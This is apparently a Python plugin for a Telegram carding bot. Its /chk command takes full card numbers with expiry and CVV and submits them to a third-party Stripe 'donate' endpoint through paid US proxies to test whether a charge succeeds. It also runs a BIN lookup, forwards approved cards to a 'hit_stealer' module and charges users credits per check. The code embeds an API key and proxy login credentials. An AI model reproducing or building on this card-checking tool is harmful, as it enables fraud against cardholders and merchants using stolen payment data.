from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType
import requests, re, time, json
from plugins.func.users_sql import *
from plugins.tools.hit_stealer import send_hit_if_approved
from datetime import date

session = requests.Session()

@Client.on_message(filters.command("chk", prefixes=["/", "."]))
async def cmd_chk(client, message):
    try:
        user_id = str(message.from_user.id)
        username = message.from_user.username or "None"
        chat_id = message.chat.id
        chat_type = message.chat.type

        # Manual registration required
        regdata = fetchinfo(user_id)
        if not regdata:
            return await message.reply_text("❌ You are not registered. Use /register first.")

        role = regdata[2].upper() if regdata[2] else "FREE"
        credit = int(regdata[5] or 0)
        wait_time = int(regdata[6] or (15 if role == "FREE" else 5))
        antispam_time = int(regdata[7] or 0)
        now = int(time.time())

        if chat_type == ChatType.PRIVATE and role == "FREE":
            return await message.reply_text(
                "Premium Users Required ⚠️\nOnly Premium Users can use this command in bot PM.\nJoin group for free use:",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Join Group", url="https://t.me/+Rl9oTRlGfbIwZDhk")]
                ]),
                disable_web_page_preview=True
            )

        GROUP = open("plugins/group.txt").read().splitlines()
        if chat_type in [ChatType.GROUP, ChatType.SUPERGROUP] and str(chat_id) not in GROUP:
            return await message.reply_text("❌ Unauthorized group. Contact admin.")

        if credit < 1:
            return await message.reply_text("❌ Insufficient credit.")
        if now - antispam_time < wait_time:
            return await message.reply_text(f"⏳ Wait {wait_time - (now - antispam_time)}s (AntiSpam)")

        cc_text = None
        if message.reply_to_message:
            cc_text = message.reply_to_message.text or message.reply_to_message.caption
        elif len(message.text.split(maxsplit=1)) > 1:
            cc_text = message.text.split(maxsplit=1)[1]

        if not cc_text:
            return await message.reply_text("❌ Usage: /chk <cc|mm|yy|cvv>")

        match = re.search(r"(\d{12,16})[^\d]?(\d{1,2})[^\d]?(\d{2,4})[^\d]?(\d{3,4})", cc_text)
        if not match:
            return await message.reply_text("❌ Invalid format. Use cc|mm|yy|cvv")

        ccnum, mes, ano, cvv = match.groups()
        fullcc = f"{ccnum}|{mes}|{ano}|{cvv}"

        check_msg = await message.reply_text(f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Stripe 2$ Charge</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> Checking...
<b>⊙ Response:</b> Waiting...
""")

        tic = time.perf_counter()

        endpoint = f"https://api.netherex.com/stripe_donate?api_key=SHORIEN-SH3D-DN3N-SBJE&cc={fullcc}"
        proxies = {
            "http": "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000",
            "https": "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000"
        }

        try:
            r = session.get(endpoint, headers={"User-Agent": "Mozilla/5.0"}, timeout=30, proxies=proxies)
            data = r.json()
            card_status = data.get("status", "").lower()
            raw_message = data.get("message", "")
            card_message = "No message"

            try:
                parsed = json.loads(raw_message)
                if isinstance(parsed, dict) and "errors" in parsed:
                    card_message = parsed["errors"].replace("Stripe Error:", "").strip()
                else:
                    card_message = raw_message
            except:
                card_message = raw_message
        except Exception as err:
            card_status = "error"
            card_message = f"Error: {err}"

        # BIN Lookup
        try:
            bininfo = session.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}", timeout=10).json()
            brand = str(bininfo.get("brand") or bininfo.get("scheme") or "N/A").upper()
            type_ = str(bininfo.get("type", "N/A")).upper()
            level = str(bininfo.get("level", "N/A")).upper()
            bank = str(bininfo.get("bank", "N/A")).upper()
            country = str(bininfo.get("country_name", "N/A")).upper()
            flag = bininfo.get("country_flag", "🏳️")
        except Exception as e:
            print("BIN lookup failed:", e)
            brand = type_ = level = bank = country = "N/A"
            flag = "🏳️"

        toc = time.perf_counter()
        status = "Approved ✅" if card_status == "success" else "Declined ❌"

        msg = f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Stripe 2$ Charge</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> {status}
<b>⊙ Response:</b> {card_message}
<b>⊙ Bank:</b> {bank}
<b>⊚ Bin type:</b> {brand} - {type_} - {level}
<b>⊙ Country:</b> {country} {flag}
<b>⊙ Time:</b> {toc - tic:.2f}s
<b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
"""

        # Handle Telegram "message not modified" cleanly
        try:
            await client.edit_message_text(chat_id, check_msg.id, msg)
        except Exception as e:
            if "MESSAGE_NOT_MODIFIED" not in str(e):
                await message.reply_text(f"❌ Error: {str(e)}")

        if "success" in card_status or "live" in card_message.lower():
            await send_hit_if_approved(client, msg)

        updatedata(user_id, "credits", credit - 1)
        updatedata(user_id, "antispam_time", now)
        plan_expirychk(user_id)

    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")
